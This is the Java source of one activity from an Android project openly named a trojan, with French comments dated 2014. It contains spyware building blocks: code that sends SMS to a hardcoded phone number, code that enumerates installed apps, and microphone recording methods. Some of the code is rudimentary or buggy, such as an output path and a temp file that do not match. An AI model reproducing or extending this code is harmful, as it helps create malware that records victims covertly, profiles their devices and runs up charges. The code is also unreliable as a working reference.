package trojan.android.android_trojan.Activity;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.graphics.drawable.Drawable;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import trojan.android.android_trojan.R;

/**
 * Created by Jean-Laurent on 26/11/2014.
 */
public class FirstActivity extends Activity {
    private static final String TAG = "first_activity";
    Context context;
    private Button button01;
    private Button button02;
    private Button button03;
    private File FichierEnregistre;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.first_activity);
        button01 = (Button) findViewById(R.id.button01);
        button02 = (Button) findViewById(R.id.button02);
        button03 = (Button) findViewById(R.id.button03);

        button01.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                for (int i = 1; i <= 3; i++) {
                    SendSMS("0628470850", "Test Message 2.1");
                }
            }
        });

        button02.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                getPackages();
            }
        });

    }

    public void SendSMS(String numTelephone, String message) {
        // permet de voir dans les log si la fct marche
        Log.d(TAG, "SendSMS");
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(numTelephone, null, message, null, null);
    }


    class PInfo {
        private String appname = "";
        private String pname = "";
        private String versionName = "";
        private int versionCode = 0;
        private Drawable icon;

        private void prettyPrint() {
            Log.d(TAG, appname + "\t" + pname + "\t" + versionName + "\t" + versionCode);
        }
    }

    private ArrayList<PInfo> getPackages() {
        ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
        final int max = apps.size();
        for (int i = 0; i < max; i++) {
            apps.get(i).prettyPrint();
        }
        return apps;
    }

    private ArrayList<PInfo> getInstalledApps(boolean getSysPackages) {
        ArrayList<PInfo> res = new ArrayList<PInfo>();
        List<PackageInfo> packs = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packs.size(); i++) {
            PackageInfo p = packs.get(i);
            if ((!getSysPackages) && (p.versionName == null)) {
                continue;
            }
            PInfo newInfo = new PInfo();
            newInfo.appname = p.applicationInfo.loadLabel(getPackageManager()).toString();
            newInfo.pname = p.packageName;
            newInfo.versionName = p.versionName;
            newInfo.versionCode = p.versionCode;
            newInfo.icon = p.applicationInfo.loadIcon(getPackageManager());
            res.add(newInfo);
        }
        return res;
    }


    private MediaRecorder recorder;

    public void StartRecording() throws IOException {
        Log.d("StartRecording", "On lance l'enregistrement");
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);

        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
        recorder.setOutputFile("MonFichier.mp3");

        recorder.prepare();
        recorder.start();


        //Vérification de la présence d'une carte de stockage
        String state = android.os.Environment.getExternalStorageState();
        if (!state.equals(Environment.MEDIA_MOUNTED)) {
            Log.e(TAG, "La Carte mémoire n'est pas présente");
            return;
        }


        //Vérifie que l'on peut écrire sur la carte.
        File repertoireStockage = Environment.getExternalStorageDirectory();
        if (!repertoireStockage.canWrite()) {
            Log.e(TAG, "Impossible d'ecrire sur le péripherique de stockage");
            return;
        }

        //Création du fichier de destination.
        try {
            FichierEnregistre = File.createTempFile("EnregistrementAudio",".mp4",repertoireStockage);
        } catch (IOException e) {
            Log.e(TAG, "Problème E/S avant l'enregistrement");
            return;
        }}


    public void StopRecording() {
        Log.e("StopRecording", "On stop l'enregistrement");
        recorder.stop();
        recorder.reset();   // You can reuse the object by going back to setAudioSource() step
        recorder.release(); // Now the object cannot be reused
    }

}






